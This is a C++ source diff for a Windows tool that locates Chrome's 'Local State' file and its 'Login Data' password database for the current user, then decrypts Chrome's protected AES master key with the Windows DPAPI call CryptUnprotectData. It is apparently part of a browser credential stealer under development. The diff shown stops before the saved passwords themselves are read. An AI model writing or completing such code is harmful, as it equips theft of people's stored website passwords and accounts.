@@ -3,10 +3,11 @@
 #include <iostream>
 #include <stdio.h>
 #include <string.h>
+#include <tuple>
 #include <vector>
 #include "json.hpp" //Source: https://github.com/nlohmann/json
 
-std::string getChromePath() {
+std::tuple<std::string, std::string> getChromePaths() {
 	// Get current user (for the filepath)
 	// 256 is max username length (see lmcons.h)
 	DWORD bufSize = 256 + 1;
@@ -19,17 +20,24 @@ std::string getChromePath() {
 	userBuf[bufSize] = '\0';
 	// printf("%s\n", userBuf);
 
-	// Get filepath
-	std::string filePath = "C:\\Users\\";
+	// Get Local State filepath
+	std::string lsFilePath = "C:\\Users\\";
 	std::string userName = userBuf;
-	std::string endPath = "\\AppData\\Local\\Google\\User Data\\Local State";
+	std::string endPath = "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State";
 
-	filePath.append(userName);
-	filePath.append(endPath);
+	lsFilePath.append(userName);
+	lsFilePath.append(endPath);
 
 	// printf("%s\n", filePath.c_str());
 
-	return filePath;
+	// Get SQLite Chrome database path
+	std::string dataFilePath = "C:\\Users\\";
+	std::string endPath2 = "\\AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data";
+
+	dataFilePath.append(userName);
+	dataFilePath.append(endPath2);
+
+	return {lsFilePath, dataFilePath};
 }
 
 std::string loadLocalState(std::string chromePath) {
@@ -48,7 +56,7 @@ std::string loadLocalState(std::string chromePath) {
 		return "";
 	}
 
-	DWORD chromeBufSize = 8192 + 1; // Arbitrary sized buffer, can adjust
+	DWORD chromeBufSize = 131072 + 1; // Arbitrary sized buffer, can adjust
 	DWORD bytesRead;
 	char* chromeContentsBuf = (char*) malloc(chromeBufSize);
 
@@ -116,11 +124,49 @@ std::vector<BYTE> b64Decode(std::string strInput){
     return output;
 }
 
-void decryptDPAPI(std::string decodedKey) {
-	//TODO
+BYTE* decryptDPAPI(std::string decodedKey) {
+	
+	// Create key BLOB
+	DWORD keyLen = decodedKey.length();
+	BYTE keyArr[keyLen];
+    std::memcpy(keyArr, decodedKey.data(), keyLen);
+
+	CRYPT_INTEGER_BLOB keyBlob;
+	keyBlob.cbData = keyLen;
+	keyBlob.pbData = keyArr;
+
+	// Create entropy BLOB
+	BYTE* entropyArr = NULL;
+
+	CRYPT_INTEGER_BLOB entropyBlob;
+	entropyBlob.cbData = 0;
+	entropyBlob.pbData = entropyArr;
+
+	// Init result, unprotect data
+	CRYPT_INTEGER_BLOB resultBlob;
+
+	if (!CryptUnprotectData(
+			&keyBlob,
+			NULL,
+			&entropyBlob,
+			NULL,
+			NULL,
+			0,
+			&resultBlob
+		)) {
+		printf("[ERROR] DPAPI decryption failed.\n");
+		return NULL;
+	}
+
+	// Obtain data, free BLOB data
+	BYTE* resultBuf = (BYTE*) malloc(resultBlob.cbData); // +1?
+	std::memcpy(resultBuf, resultBlob.pbData, resultBlob.cbData);
+	LocalFree(resultBlob.pbData);
+
+	return resultBuf;
 }
 
-void getAESKEy(std::string chromePath) {
+BYTE* getAESKEy(std::string chromePath) {
 
 	// Get file "Local State" contents
 	std::string localStateContents = loadLocalState(chromePath);
@@ -145,12 +191,16 @@ int main(int argc, char* argv[]) {
 	// Access folder C:\Users\<User>\AppData\Local\Google\User Data
 	// "Local State" is the file
 
-	// Get filepath
-	std::string chromePath = getChromePath();
+	// Get Local State and SQLite Chrome database filepaths
+	auto [chromePath, databasePath] = getChromePaths();
 	printf("chromePath: %s\n", chromePath.c_str());
 
 	// Get AES key
-	getAESKEy(chromePath);
+	BYTE* key = getAESKEy(chromePath);
+	//printf("Key: %s\n", key);
+
+	// SQLite Chrome database path
+	printf("databasePath: %s\n", databasePath.c_str());
 
 	// getChromeContents(): get contents of JSON file "Local State"
 
